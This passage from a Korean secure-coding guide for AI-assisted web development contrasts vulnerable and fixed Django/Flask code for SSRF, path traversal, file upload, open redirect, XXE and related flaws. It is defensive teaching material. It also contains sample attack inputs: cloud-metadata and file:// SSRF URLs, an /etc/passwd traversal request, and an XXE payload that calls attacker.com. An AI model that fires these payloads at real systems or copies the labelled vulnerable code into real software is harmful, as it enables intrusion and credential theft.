csrf = CSRFProtect()
csrf.init_app(app)
```

```html
<!-- Flask 템플릿 -->
<form action="" method="POST">
    <!-- CSRF 토큰을 hidden input으로 포함합니다 -->
    <input type="hidden" name="csrf_token" value="{{ csrf_token() }}" />
    <table>
        {{ table }}
    </table>
    <input type="submit"/>
</form>
```

> **💡 팁:** Django에서 POST 요청 시 "403 Forbidden" 에러가 발생하면, CSRF를 비활성화하는 대신 템플릿의 `<form>` 태그 안에 `{% csrf_token %}`을 추가하십시오. 이것이 올바른 해결 방법입니다.

### 바이브 코딩 시 체크포인트

- [ ] **Django `settings.py`에서 `CsrfViewMiddleware`가 활성화되어 있는가?**
- [ ] **모든 POST 폼에 `{% csrf_token %}`(Django) 또는 `{{ csrf_token() }}`(Flask)가 포함되어 있는가?**
- [ ] **`@csrf_exempt` 데코레이터가 불필요하게 사용되고 있지 않은가?**
- [ ] **AJAX 요청 시 CSRF 토큰을 헤더에 포함하고 있는가?**

---

## 4-3. 서버사이드 요청 위조(SSRF)

### SSRF 공격 흐름도

#### ❌ 취약한 흐름 (URL 검증 없음)

```
                         ┌─────────────────────────────────────────────────┐
                         │              내부 네트워크 (방화벽 내부)           │
                         │                                                 │
 ┌─────────────┐         │  ┌─────────────────┐         ┌───────────────┐  │
 │   공격자     │         │  │   웹 애플리케이션  │         │  내부 서버     │  │
 │  (외부)      │         │  │                 │         │ (DB, 관리자 등) │  │
 │             │         │  │  URL 파라미터:   │         │               │  │
 │ url=http:// │         │  │  검증 없이       │         │ ⚠ 내부 정보   │  │
 │ 192.168.1.1 │ ══════▶ │  │  서버가 직접 요청 │ ══════▶ │   유출됨!     │  │
 │ /admin      │         │  │                 │         │               │  │
 └─────────────┘         │  └─────────────────┘         └───────────────┘  │
                         │         │                                       │
       ①                 │         │ ══════▶  ┌───────────────────────┐    │
   공격자가 내부 주소를     │         │          │ 클라우드 메타데이터     │    │
   URL 파라미터로 전달     │         │          │ 169.254.169.254      │    │
                         │         │          │                       │    │
                         │         │          │ ⚠ AWS 자격증명,       │    │
                         │         │          │   IAM 역할 정보 유출!  │    │
                         │         │          └───────────────────────┘    │
                         │                                                 │
                         └─────────────────────────────────────────────────┘
```

#### 공격 대상별 위험도

```
  공격자 ══▶ 웹 앱 ══▶ ?

  ┌──────────────────────────────────────────────────────────────────────┐
  │  대상 ①  내부 서비스 접근                                             │
  │  url=http://192.168.1.100:8080/admin                                │
  │  ══════▶ 방화벽 우회하여 내부 관리자 페이지 접근                        │
  ├──────────────────────────────────────────────────────────────────────┤
  │  대상 ②  클라우드 메타데이터 탈취                                      │
  │  url=http://169.254.169.254/latest/meta-data/iam/                   │
  │  ══════▶ AWS/GCP/Azure 인스턴스 자격증명 탈취                         │
  ├──────────────────────────────────────────────────────────────────────┤
  │  대상 ③  내부 포트 스캔                                               │
  │  url=http://127.0.0.1:6379 (Redis)                                  │
  │  ══════▶ 내부 서비스 존재 여부 및 포트 정보 파악                        │
  ├──────────────────────────────────────────────────────────────────────┤
  │  대상 ④  로컬 파일 읽기                                               │
  │  url=file:///etc/passwd                                             │
  │  ══════▶ 서버 내부 파일 시스템 직접 접근                               │
  └──────────────────────────────────────────────────────────────────────┘
```

#### ✅ 안전한 흐름 (URL 화이트리스트 적용)

```
                         ┌─────────────────────────────────────────────────┐
                         │              내부 네트워크 (방화벽 내부)           │
                         │                                                 │
 ┌─────────────┐         │  ┌─────────────────┐         ┌───────────────┐  │
 │   공격자     │         │  │   웹 애플리케이션  │         │  내부 서버     │  │
 │  (외부)      │         │  │                 │         │               │  │
 │             │         │  │ ┌─────────────┐ │         │ ✅ 접근 차단   │  │
 │ url=http:// │         │  │ │ URL 검증     │ │         │               │
 │ 192.168.1.1 │ ──────▶ │  │ │             │ │ ─ ─ ─▶ │ (요청 도달     │  │
 │ /admin      │         │  │ │ ❌ 차단!     │ │         │  하지 않음)    │  │
 │             │         │  │ └─────────────┘ │         │               │  │
 └─────────────┘         │  └─────────────────┘         └───────────────┘  │
                         │         │                                       │
       ①                 │         │                                       │
   동일한 공격 시도        │         │ ─ ─ ─▶  ┌───────────────────────┐    │
                         │         │          │ 클라우드 메타데이터     │    │
                         │         │          │ 169.254.169.254      │    │
                         │  ┌──────┴────────┐ │                       │    │
                         │  │  검증 규칙:     │ │ ✅ 접근 차단           │    │
                         │  │               │ │                       │    │
                         │  │ • 허용 도메인   │ └───────────────────────┘    │
                         │  │   화이트리스트  │                              │
                         │  │ • 내부 IP 차단 │                              │
                         │  │ • 프로토콜 제한 │                              │
                         │  │   (http/https) │                              │
                         │  │ • DNS 재바인딩 │                              │
                         │  │   방어         │                              │
                         │  └───────────────┘                              │
                         └─────────────────────────────────────────────────┘
```

#### 방어 체크리스트

```
  ┌───────────────────────────────────────────────────────────────┐
  │  SSRF 방어 전략                                               │
  ├───────────────────────────────────────────────────────────────┤
  │                                                               │
  │  ① URL 화이트리스트     허용된 도메인만 접근 가능               │
  │     ──────▶            api.example.com, cdn.example.com      │
  │                                                               │
  │  ② 내부 IP 대역 차단    사설 IP 및 루프백 주소 거부              │
  │     ──────▶            10.x, 172.16.x, 192.168.x, 127.x     │
  │                                                               │
  │  ③ 프로토콜 제한        http/https만 허용                      │
  │     ──────▶            file://, gopher://, dict:// 차단       │
  │                                                               │
  │  ④ 응답 검증            예상 형식(JSON 등)만 반환               │
  │     ──────▶            내부 정보 노출 방지                     │
  │                                                               │
  │  ⑤ 네트워크 분리        웹 서버의 내부 접근 권한 최소화           │
  │     ──────▶            별도 네트워크 세그먼트 운영               │
  │                                                               │
  └───────────────────────────────────────────────────────────────┘
```

### 개요

서버사이드 요청 위조(Server-Side Request Forgery, SSRF)는 공격자가 서버 측에서 다른 서버로 보내는 요청을 조작하여, 내부 네트워크의 자원에 접근하는 공격입니다.

바이브 코딩으로 외부 API를 호출하는 기능, URL 프리뷰(Preview) 기능, 웹훅(Webhook) 처리 등을 구현할 때 이 취약점에 노출될 수 있습니다.

### 왜 위험한가

SSRF는 공격자가 **서버의 신뢰된 네트워크 위치**를 악용하는 공격입니다:

- **내부 시스템 접근**: `http://192.168.0.45/admin`과 같이 외부에서 접근할 수 없는 관리자 페이지에 접근
- **클라우드 메타데이터 탈취**: `http://169.254.169.254/latest/meta-data/`로 AWS 인스턴스의 인증 키를 획득
- **내부 파일 열람**: `file:///etc/passwd`로 서버의 파일 시스템에 접근
- **포트 스캐닝**: 내부 네트워크의 서비스 구성을 파악

```text
# 공격자의 입력 예시
http://example.com/api?url=http://192.168.0.45/member/list.json
http://example.com/api?url=file:///etc/passwd
http://example.com/api?url=http://169.254.169.254/latest/meta-data/
```

### 취약한 코드

#### ❌ 취약한 코드: 사용자 입력 URL로 HTTP 요청

```python
from django.shortcuts import render
import requests

def call_third_party_api(request):
    addr = request.POST.get('address', '')

    # 사용자가 입력한 주소를 검증하지 않고 HTTP 요청을 보냅니다
    result = requests.get(addr).text
    return render(request, '/result.html', {'result': result})
```

### 안전한 코드

#### ✅ 안전한 코드: 허용 URL 화이트리스트 적용

```python
from django.shortcuts import render
import requests

# 허용하는 서버 목록을 화이트리스트로 관리합니다
# DNS rebinding 공격 방지를 위해 도메인보다 IP 사용을 권장합니다
ALLOW_SERVER_LIST = [
    'https://127.0.0.1/latest/',
    'https://192.168.0.1/user_data',
    'https://192.168.0.100/v1/public',
]

def call_third_party_api(request):
    addr = request.POST.get('address', '')

    # 화이트리스트에 포함된 URL만 허용합니다
    if addr not in ALLOW_SERVER_LIST:
        return render(request, '/error.html', {'error': '허용되지 않은 서버입니다.'})

    result = requests.get(addr).text
    return render(request, '/result.html', {'result': result})
```

#### ✅ 안전한 코드: URL 파싱 후 검증

```python
from urllib.parse import urlparse
import ipaddress
import requests

BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # 클라우드 메타데이터
    ipaddress.ip_network('127.0.0.0/8'),     # 루프백
]

def safe_request(url):
    parsed = urlparse(url)

    # file:// 등의 위험한 프로토콜 차단
    if parsed.scheme not in ('http', 'https'):
        raise ValueError('허용되지 않은 프로토콜입니다.')

    # 내부 네트워크 IP 차단
    import socket
    ip = socket.gethostbyname(parsed.hostname)
    for network in BLOCKED_NETWORKS:
        if ipaddress.ip_address(ip) in network:
            raise ValueError('내부 네트워크 접근은 허용되지 않습니다.')

    return requests.get(url, timeout=5).text
```

> **💡 팁:** 클라우드 환경(AWS, GCP, Azure)에서는 메타데이터 서비스(169.254.169.254)에 대한 접근을 반드시 차단하십시오. 메타데이터를 통해 인스턴스의 IAM 역할 자격 증명이 탈취될 수 있습니다.

### 바이브 코딩 시 체크포인트

- [ ] **사용자 입력 URL로 서버에서 HTTP 요청을 보내는 코드가 있는가?**
- [ ] **URL 화이트리스트 또는 내부 네트워크 차단이 적용되어 있는가?**
- [ ] **`file://`, `gopher://` 등 위험한 프로토콜이 차단되어 있는가?**
- [ ] **클라우드 메타데이터 IP(169.254.169.254)에 대한 접근이 차단되어 있는가?**

---

## 4-4. HTTP 응답 분할(HTTP Response Splitting)

### 개요

HTTP 응답 분할(HTTP Response Splitting)은 HTTP 응답 헤더에 사용자 입력값이 포함될 때, 해당 입력에 개행문자(CR: `\r`, LF: `\n`)가 존재하면 HTTP 응답이 두 개 이상으로 분리되는 취약점입니다. 공격자는 이를 이용하여 두 번째 응답에 악성 코드를 주입할 수 있습니다.

### 왜 위험한가

응답 헤더가 분할되면 공격자가 완전히 새로운 HTTP 응답을 만들어낼 수 있습니다. 이를 통해 XSS 공격이나 캐시 훼손(Cache Poisoning) 공격이 가능합니다.

### 취약한 코드

#### ❌ 취약한 코드: 외부 입력을 응답 헤더에 직접 사용

```python
from django.http import HttpResponse

def route(request):
    content_type = request.POST.get('content-type')

    # 외부 입력값을 검증 없이 응답 헤더에 포함합니다
    res = HttpResponse()
    res['Content-Type'] = content_type
    return res
```

### 안전한 코드

#### ✅ 안전한 코드: 개행문자 제거

```python
from django.http import HttpResponse

def route(request):
    content_type = request.POST.get('content-type')

    # 응답 헤더에 포함될 수 있는 개행문자를 제거합니다
    content_type = content_type.replace('\r', '')
    content_type = content_type.replace('\n', '')

    res = HttpResponse()
    res['Content-Type'] = content_type
    return res
```

> **💡 팁:** 최신 버전의 Django와 Flask는 응답 헤더에서 개행문자를 자동으로 처리하는 보호 기능이 내장되어 있습니다. 하지만 프레임워크의 보호에만 의존하지 말고, 응답 헤더에 사용되는 외부 입력값은 항상 검증하는 습관을 가지십시오. 프레임워크와 라이브러리를 항상 최신 버전으로 유지하는 것도 중요합니다.

### 바이브 코딩 시 체크포인트

- [ ] **사용자 입력값이 HTTP 응답 헤더(Set-Cookie, Content-Type, Location 등)에 포함되고 있지 않은가?**
- [ ] **불가피하게 포함되는 경우 `\r`, `\n` 개행문자가 제거되고 있는가?**
- [ ] **Django, Flask 등 프레임워크가 최신 버전인가?**


---

# Chapter 05. 파일과 URL을 노리는 공격

## 5-1. 경로 조작 및 자원 삽입(Path Traversal & Resource Injection)

### 개요

경로 조작(Path Traversal)은 검증되지 않은 외부 입력값을 사용하여 파일 시스템의 경로를 조작함으로써, 공격자가 허가되지 않은 파일이나 디렉터리(Directory)에 접근할 수 있는 보안약점입니다. 자원 삽입(Resource Injection)은 이 원리를 파일뿐 아니라 소켓 포트, 네트워크 자원 등에까지 확장한 개념입니다.

바이브 코딩으로 파일 업로드/다운로드 기능, 이미지 뷰어, 문서 관리 시스템 등을 만들 때 이 취약점이 자주 발생합니다. AI 도구가 생성하는 파일 처리 코드에서 경로 검증이 누락되는 경우가 많으므로 반드시 확인해야 합니다.

### 왜 위험한가

공격자가 파일명에 `../`(상위 디렉터리 이동) 문자열을 삽입하면, 서버의 의도된 디렉터리를 벗어나 시스템의 모든 파일에 접근할 수 있습니다:

```text
# 정상적인 요청
GET /download?file=report.txt
# 서버에서 열리는 파일: /var/www/uploads/report.txt

# 공격자의 요청
GET /download?file=../../../../etc/passwd
# 서버에서 열리는 파일: /etc/passwd (운영체제 사용자 정보!)
```

이를 통해 공격자는 다음과 같은 행위를 할 수 있습니다:

- **시스템 파일 열람**: `/etc/passwd`, `/etc/shadow`, 환경설정 파일 등
- **소스 코드 유출**: 애플리케이션의 소스 코드나 설정 파일에서 데이터베이스 비밀번호 등을 탈취
- **서버 설정 파일 변경**: 설정 파일을 변경하여 시스템 제어권 획득

### 취약한 코드

#### ❌ 취약한 코드: 외부 입력값을 파일 경로에 직접 사용

```python
import os
from django.shortcuts import render

def get_info(request):
    # 외부 입력값으로부터 파일명을 입력 받습니다
    request_file = request.POST.get('request_file')
    (filename, file_ext) = os.path.splitext(request_file)
    file_ext = file_ext.lower()

    if file_ext not in ['.txt', '.csv']:
        return render(request, '/error.html', {'error': '파일을 열 수 없습니다.'})

    # 확장자만 검증하고 경로 조작 문자열은 검증하지 않습니다
    # ../../../../etc/passwd.txt 같은 입력이 가능합니다
    with open(request_file) as f:
        data = f.read()

    return render(request, '/success.html', {'data': data})
```

#### ❌ 취약한 코드: 외부 입력값을 소켓 포트 번호로 사용

```python
import socket
from django.shortcuts import render

def get_info(request):
    port = int(request.POST.get('port'))
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        # 검증되지 않은 포트 번호로 소켓을 바인딩합니다
        # 기존 서비스와 충돌하거나 특권 포트에 접근할 수 있습니다
        s.bind(('127.0.0.1', port))
        ...
```

### 안전한 코드

#### ✅ 안전한 코드: 경로 조작 문자열 필터링

```python
import os
from django.shortcuts import render

def get_info(request):
    request_file = request.POST.get('request_file')
    (filename, file_ext) = os.path.splitext(request_file)
    file_ext = file_ext.lower()

    if file_ext not in ['.txt', '.csv']:
        return render(request, '/error.html', {'error': '파일을 열 수 없습니다.'})

    # 경로 조작 문자열을 필터링합니다
    filename = filename.replace('.', '')
    filename = filename.replace('/', '')
    filename = filename.replace('\\', '')

    try:
        with open(filename + file_ext) as f:
            data = f.read()
    except FileNotFoundError:
        return render(request, '/error.html',
                      {'error': '파일이 존재하지 않거나 열 수 없는 파일입니다.'})

    return render(request, '/success.html', {'data': data})
```

#### ✅ 더 안전한 코드: 기본 디렉터리(Base Directory) 제한

```python
import os
from django.shortcuts import render

# 파일 접근이 허용된 기본 디렉터리를 지정합니다
BASE_DIR = '/var/www/uploads'

def get_info(request):
    request_file = request.POST.get('request_file')
    (filename, file_ext) = os.path.splitext(request_file)
    file_ext = file_ext.lower()

    if file_ext not in ['.txt', '.csv']:
        return render(request, '/error.html', {'error': '파일을 열 수 없습니다.'})

    # 절대 경로를 생성하고, 기본 디렉터리 내에 있는지 확인합니다
    safe_path = os.path.realpath(os.path.join(BASE_DIR, filename + file_ext))

    if not safe_path.startswith(os.path.realpath(BASE_DIR)):
        return render(request, '/error.html', {'error': '접근이 허용되지 않은 경로입니다.'})

    try:
        with open(safe_path) as f:
            data = f.read()
    except FileNotFoundError:
        return render(request, '/error.html', {'error': '파일을 찾을 수 없습니다.'})

    return render(request, '/success.html', {'data': data})
```

> **💡 팁:** `os.path.realpath()`는 심볼릭 링크(Symbolic Link)와 `../` 등의 경로 조작을 모두 해석하여 실제 절대 경로를 반환합니다. 이 결과가 허용된 기본 디렉터리로 시작하는지 확인하면 경로 조작 공격을 효과적으로 방어할 수 있습니다.

#### ✅ 안전한 코드: 자원 삽입 방지 - 포트 번호 화이트리스트

```python
import socket
from django.shortcuts import render

ALLOW_PORT = [4000, 6000, 9000]

def get_info(request):
    port = int(request.POST.get('port'))

    # 허용된 포트 번호만 사용할 수 있도록 제한합니다
    if port not in ALLOW_PORT:
        return render(request, '/error.html', {'error': '소켓연결 실패'})

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('127.0.0.1', port))
        ...
```

### 바이브 코딩 시 체크포인트

- [ ] **파일 경로에 사용자 입력이 포함되는 경우 `../`, `/`, `\` 등의 경로 조작 문자가 필터링되고 있는가?**
- [ ] **`os.path.realpath()`로 실제 경로를 해석한 후 기본 디렉터리 범위 내인지 확인하고 있는가?**
- [ ] **파일 다운로드 기능에서 사용자가 임의의 시스템 파일에 접근할 수 없도록 제한되어 있는가?**
- [ ] **외부 입력값이 포트 번호, 소켓 주소 등 시스템 자원 식별자로 사용되는 경우 화이트리스트로 제한하고 있는가?**

---

## 5-2. 위험한 형식 파일 업로드(Unrestricted File Upload)

### 개요

파일 업로드 기능에서 서버 측 실행 가능한 스크립트 파일(`.py`, `.php`, `.jsp`, `.sh` 등)의 업로드를 허용하면, 공격자가 웹 쉘(Web Shell)을 업로드하여 서버를 완전히 장악할 수 있습니다.

바이브 코딩으로 이미지 업로드, 첨부파일 기능 등을 구현할 때 가장 흔하게 발생하는 취약점 중 하나입니다. AI가 생성한 파일 업로드 코드에서 검증 로직이 누락되는 경우가 많습니다.

### 왜 위험한가

공격자가 악성 스크립트를 업로드하면:

1. 서버에서 해당 파일을 직접 실행할 수 있습니다 (웹 쉘)
2. 서버의 모든 파일에 접근하고, 데이터베이스를 조작하고, 다른 서버를 공격하는 거점으로 활용할 수 있습니다
3. 대용량 파일을 반복 업로드하여 디스크를 가득 채우는 서비스 거부(DoS) 공격도 가능합니다

확장자만 검사하는 것으로는 부족합니다. 공격자는 `malware.py.jpg`처럼 이중 확장자를 사용하거나, 실제 파일 내용은 스크립트이면서 확장자만 `.jpg`로 변경하는 방법을 사용합니다.

### 취약한 코드

#### ❌ 취약한 코드: 파일 검증 없이 업로드 허용

```python
from django.shortcuts import render
from django.core.files.storage import FileSystemStorage

def file_upload(request):
    if request.FILES['upload_file']:
        upload_file = request.FILES['upload_file']
        fs = FileSystemStorage(location='media/screenshot', base_url='media/screenshot')

        # 파일의 크기, 개수, 확장자, 내용을 전혀 검증하지 않습니다
        filename = fs.save(upload_file.name, upload_file)
        return render(request, '/success.html', {'filename': filename})

    return render(request, '/error.html', {'error': '파일 업로드 실패'})
```

### 안전한 코드

#### ✅ 안전한 코드: 다중 검증 적용

```python
import os
import uuid
from django.shortcuts import render
from django.core.files.storage import FileSystemStorage

# 업로드 제한 설정
FILE_COUNT_LIMIT = 5
FILE_SIZE_LIMIT = 5 * 1024 * 1024  # 5MB

# 허용하는 확장자를 화이트리스트로 관리합니다
WHITE_LIST_EXT = ['.jpg', '.jpeg', '.png', '.gif']

# 허용하는 MIME 타입
WHITE_LIST_MIME = ['image/jpeg', 'image/png', 'image/gif']

def file_upload(request):
    # 1단계: 파일 개수 제한
    if len(request.FILES) == 0 or len(request.FILES) > FILE_COUNT_LIMIT:
        return render(request, '/error.html', {'error': '파일 개수 초과'})

    filename_list = []
    for key, upload_file in request.FILES.items():
        # 2단계: MIME 타입 검사
        if upload_file.content_type not in WHITE_LIST_MIME:
            return render(request, '/error.html', {'error': '허용되지 않은 파일 형식입니다.'})

        # 3단계: 파일 크기 제한
        if upload_file.size > FILE_SIZE_LIMIT:
            return render(request, '/error.html', {'error': '파일 크기가 초과되었습니다.'})

        # 4단계: 파일 확장자 검사
        file_name, file_ext = os.path.splitext(upload_file.name)
        if file_ext.lower() not in WHITE_LIST_EXT:
            return render(request, '/error.html', {'error': '허용되지 않은 확장자입니다.'})

        # 5단계: 파일명을 랜덤으로 변경하여 저장합니다
        safe_filename = str(uuid.uuid4()) + file_ext.lower()
        fs = FileSystemStorage(location='media/screenshot', base_url='media/screenshot')
        saved_name = fs.save(safe_filename, upload_file)
        filename_list.append(saved_name)

    return render(request, '/success.html', {'filename_list': filename_list})
```

#### ✅ 보너스: 매직 바이트(Magic Bytes) 검증

```python
import struct

# 파일의 실제 형식을 매직 바이트로 확인합니다
MAGIC_BYTES = {
    'jpg': [b'\xff\xd8\xff'],
    'png': [b'\x89\x50\x4e\x47'],
    'gif': [b'\x47\x49\x46\x38'],
    'pdf': [b'\x25\x50\x44\x46'],
}

def verify_file_type(file_obj, expected_type):
    """파일의 매직 바이트를 확인하여 실제 파일 형식을 검증합니다."""
    header = file_obj.read(8)
    file_obj.seek(0)  # 파일 포인터를 처음으로 되돌립니다

    if expected_type not in MAGIC_BYTES:
        return False

    for magic in MAGIC_BYTES[expected_type]:
        if header.startswith(magic):
            return True

    return False
```

> **💡 팁:** 확장자와 Content-Type은 공격자가 쉽게 변조할 수 있습니다. 파일의 첫 몇 바이트에 위치한 매직 바이트(Magic Bytes, 파일 시그니처)를 확인하면 실제 파일 형식을 보다 정확하게 판별할 수 있습니다.

### 바이브 코딩 시 체크포인트

- [ ] **파일 확장자를 화이트리스트 방식으로 검증하고 있는가?**
- [ ] **Content-Type(MIME 타입)을 검사하고 있는가?**
- [ ] **파일 크기와 업로드 개수에 제한이 있는가?**
- [ ] **업로드된 파일명을 UUID 등으로 변경하여 저장하고 있는가?**
- [ ] **업로드 디렉터리가 웹 루트 외부에 위치하는가?** (URL로 직접 접근하여 실행할 수 없도록)
- [ ] **업로드된 파일에 실행 권한이 부여되지 않았는가?**

---

## 5-3. 신뢰되지 않는 URL 자동 연결(Open Redirect)

### 개요

오픈 리다이렉트(Open Redirect)는 사용자 입력값을 외부 사이트 주소로 사용하여 리다이렉트(Redirect)하는 경우, 공격자가 이를 악용하여 피해자를 피싱(Phishing) 사이트로 유도할 수 있는 취약점입니다.

바이브 코딩으로 로그인 후 원래 페이지로 돌아가는 기능, 외부 링크 연결 기능 등을 구현할 때 이 취약점에 노출됩니다.

### 왜 위험한가

공격자는 신뢰할 수 있는 도메인을 경유하여 피해자를 악성 사이트로 유도합니다:

```text
# 정상적인 URL
https://your-site.com/redirect?url=/dashboard

# 공격자가 조작한 URL (your-site.com의 신뢰도를 악용)
https://your-site.com/redirect?url=https://evil-phishing-site.com/login
```

피해자는 `your-site.com` 도메인을 보고 안전하다고 판단하지만, 실제로는 피싱 사이트로 이동합니다.

### 취약한 코드

#### ❌ 취약한 코드: 사용자 입력 URL로 직접 리다이렉트

```python
from django.shortcuts import redirect

def redirect_url(request):
    url_string = request.POST.get('url', '')

    # 사용자 입력값을 검증 없이 리다이렉트에 사용합니다
    return redirect(url_string)
```

### 안전한 코드

#### ✅ 안전한 코드: 화이트리스트로 리다이렉트 URL 제한

```python
from django.shortcuts import render, redirect

ALLOW_URL_LIST = [
    '127.0.0.1',
    '192.168.0.1',
    'https://login.myservice.com',
    '/notice',
    '/dashboard',
]

def redirect_url(request):
    url_string = request.POST.get('url', '')

    # 화이트리스트에 포함된 URL만 리다이렉트를 허용합니다
    if url_string not in ALLOW_URL_LIST:
        return render(request, '/error.html', {'error': '허용되지 않는 주소입니다.'})

    return redirect(url_string)
```

#### ✅ 안전한 코드: 상대 URL만 허용

```python
from urllib.parse import urlparse
from django.shortcuts import render, redirect

def redirect_url(request):
    url_string = request.POST.get('url', '')
    parsed = urlparse(url_string)

    # 외부 도메인으로의 리다이렉트를 차단합니다
    # scheme(http, https)이나 netloc(도메인)이 포함되면 외부 URL입니다
    if parsed.scheme or parsed.netloc:
        return render(request, '/error.html', {'error': '외부 URL로는 이동할 수 없습니다.'})

    return redirect(url_string)
```

> **💡 팁:** 로그인 후 리다이렉트 기능을 구현할 때, 가능한 한 상대 경로(Relative URL)만 허용하십시오. `/dashboard`, `/profile`과 같은 내부 경로만 허용하면 외부 사이트로의 리다이렉트를 원천적으로 차단할 수 있습니다.

### 바이브 코딩 시 체크포인트

- [ ] **`redirect()` 함수에 사용자 입력값이 직접 전달되고 있지 않은가?**
- [ ] **리다이렉트 대상 URL을 화이트리스트로 관리하거나, 상대 URL만 허용하고 있는가?**
- [ ] **Django, Flask의 redirect 관련 알려진 취약점이 패치된 최신 버전을 사용하고 있는가?**

---

## 5-4. 부적절한 XML 외부 개체 참조(XXE)

### 개요

XML 외부 엔티티(XML External Entity, XXE) 공격은 XML 문서에 포함된 DTD(Document Type Definition)의 외부 엔티티 참조 기능을 악용하여, 서버의 파일을 읽거나 내부 네트워크에 접근하는 공격입니다.

바이브 코딩 환경에서 XML 파일을 직접 파싱(Parsing)하는 경우는 비교적 적지만, API 연동이나 데이터 가져오기(Import) 기능에서 XML을 처리할 때 이 취약점에 노출될 수 있습니다.

### 왜 위험한가

공격자는 다음과 같은 악성 XML을 전송하여 서버 파일을 읽을 수 있습니다:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe1 SYSTEM "file:///etc/passwd" >
  <!ENTITY xxe2 SYSTEM "http://attacker.com/text.txt">
]>
<foo>&xxe1;&xxe2;</foo>
```

XML 파서(Parser)가 외부 엔티티를 처리하도록 설정되어 있으면, `&xxe1;`이 `/etc/passwd` 파일의 내용으로 치환됩니다.

### 취약한 코드

#### ❌ 취약한 코드: 외부 엔티티 처리 활성화

```python
from xml.sax import make_parser
from xml.sax.handler import feature_external_ges
from xml.dom.pulldom import parseString, START_ELEMENT
from django.shortcuts import render

def get_xml(request):
    if request.method == "POST":
        parser = make_parser()
        # 외부 엔티티 처리를 True로 설정하면 XXE 공격에 취약합니다
        parser.setFeature(feature_external_ges, True)
        doc = parseString(request.body.decode('utf-8'), parser=parser)
        ...
```

### 안전한 코드

#### ✅ 안전한 코드: 외부 엔티티 처리 비활성화

```python
from xml.sax import make_parser
from xml.sax.handler import feature_external_ges
from xml.dom.pulldom import parseString, START_ELEMENT
from django.shortcuts import render

def get_xml(request):
    if request.method == "POST":
        parser = make_parser()
        # 외부 엔티티 처리를 반드시 False로 설정합니다
        parser.setFeature(feature_external_ges, False)
        doc = parseString(request.body.decode('utf-8'), parser=parser)
        ...
```

#### ✅ 안전한 코드: lxml 라이브러리 사용 시 설정

```python
from lxml import etree

# resolve_entities=False로 외부 엔티티 해석을 비활성화합니다
# no_network=True로 네트워크를 통한 외부 문서 조회를 차단합니다
parser = etree.XMLParser(
    resolve_entities=False,
    no_network=True,
    dtd_validation=False,
    load_dtd=False
)

tree = etree.parse('data.xml', parser)
```

> **💡 팁:** 파이썬 기본 XML 파서(`xml.etree.ElementTree`)는 외부 엔티티를 지원하지 않아 비교적 안전하지만, 다른 유형의 XML 공격에는 취약할 수 있습니다. `lxml` 등 외부 라이브러리를 사용할 때는 반드시 `resolve_entities=False`와 `no_network=True` 옵션을 설정하십시오. 가능하다면 XML 대신 JSON 형식을 사용하는 것을 권장합니다.

### 바이브 코딩 시 체크포인트

- [ ] **XML 파서의 외부 엔티티 처리 옵션이 비활성화되어 있는가?**
- [ ] **`lxml` 사용 시 `resolve_entities=False`, `no_network=True`가 설정되어 있는가?**
- [ ] **XML 대신 JSON을 사용할 수 있는지 검토했는가?**
- [ ] **사용자가 업로드하는 XML 파일을 서버에서 파싱하는 경우, DTD 처리가 비활성화되어 있는가?**


---

# Chapter 06. 데이터 타입과 보안 결정을 노리는 공격

## 6-1. 정수형 오버플로우(Integer Overflow)

### 개요

정수형 오버플로우(Integer Overflow)는 변수가 저장할 수 있는 범위를 넘어선 값이 할당될 때, 실제 저장되는 값이 의도치 않게 아주 작은 수나 음수가 되어 프로그램이 예기치 않게 동작하는 취약점입니다.

파이썬(Python)은 다른 언어와 달리 기본 정수형에 대해 **임의 정밀도 연산(Arbitrary-Precision Arithmetic)**을 지원하므로, 순수 파이썬 코드에서는 정수형 오버플로우가 발생하지 않습니다. 하지만 `numpy`, `pandas` 등 C 기반 라이브러리를 사용할 때는 고정 크기 정수형이 사용되므로 오버플로우가 발생할 수 있습니다.

### 왜 위험한가

바이브 코딩으로 데이터 분석이나 과학 계산 기능을 구현할 때 `numpy` 등의 라이브러리를 많이 사용합니다. 이 라이브러리들은 성능을 위해 C 언어와 동일한 방식으로 정수를 처리하므로 오버플로우에 주의해야 합니다:

```python
import numpy as np

# 파이썬 기본 정수: 오버플로우 없음
result = 2 ** 100  # 정상적으로 큰 수가 저장됩니다

# numpy 64비트 정수: 오버플로우 발생!
result = np.int64(2) ** 63  # -9223372036854775808 (음수가 됩니다!)
```

오버플로우가 발생하면:

- **금액 계산 오류**: 큰 금액의 연산에서 음수가 되어 결제 로직에 이상 발생
- **반복문 무한루프**: 카운터 변수의 오버플로우로 종료 조건을 만족하지 못하는 경우
- **메모리 할당 오류**: 할당할 크기가 0이나 음수가 되어 보안 문제 유발

### 취약한 코드

#### ❌ 취약한 코드: numpy 연산에서 범위 검증 없음

```python
import numpy as np

def handle_data(number, pow):
    # 64비트를 넘어서는 숫자와 지수가 입력될 경우
    # 오버플로우가 발생하여 결과값이 0이 됩니다
    res = np.power(number, pow, dtype=np.int64)
    return res
```

#### ❌ 취약한 코드: 외부 입력값으로 numpy 연산 수행

```python
import numpy as np
from django.shortcuts import render

def calculate_price(request):
    quantity = int(request.POST.get('quantity', '0'))
    unit_price = int(request.POST.get('unit_price', '0'))

    # numpy 배열 연산에서 오버플로우 발생 가능
    total = np.int64(quantity) * np.int64(unit_price)
    # 매우 큰 수를 입력하면 total이 음수가 될 수 있습니다

    return render(request, '/price.html', {'total': total})
```

### 안전한 코드

#### ✅ 안전한 코드: 파이썬 기본 자료형으로 사전 검증

```python
import numpy as np

MAX_NUMBER = np.iinfo(np.int64).max  # 9223372036854775807
MIN_NUMBER = np.iinfo(np.int64).min  # -9223372036854775808

def handle_data(number, pow):
    # 파이썬 기본 자료형으로 먼저 계산합니다 (오버플로우 없음)
    calculated = number ** pow

    # 결과가 numpy int64 범위 내인지 확인합니다
    if calculated > MAX_NUMBER or calculated < MIN_NUMBER:
        return -1  # 오버플로우 탐지 시 에러 반환

    res = np.power(number, pow, dtype=np.int64)
    return res
```

#### ✅ 안전한 코드: 입력값 범위 제한

```python
import numpy as np
from django.shortcuts import render

MAX_QUANTITY = 10000
MAX_PRICE = 100000000  # 1억

def calculate_price(request):
    try:
        quantity = int(request.POST.get('quantity', '0'))
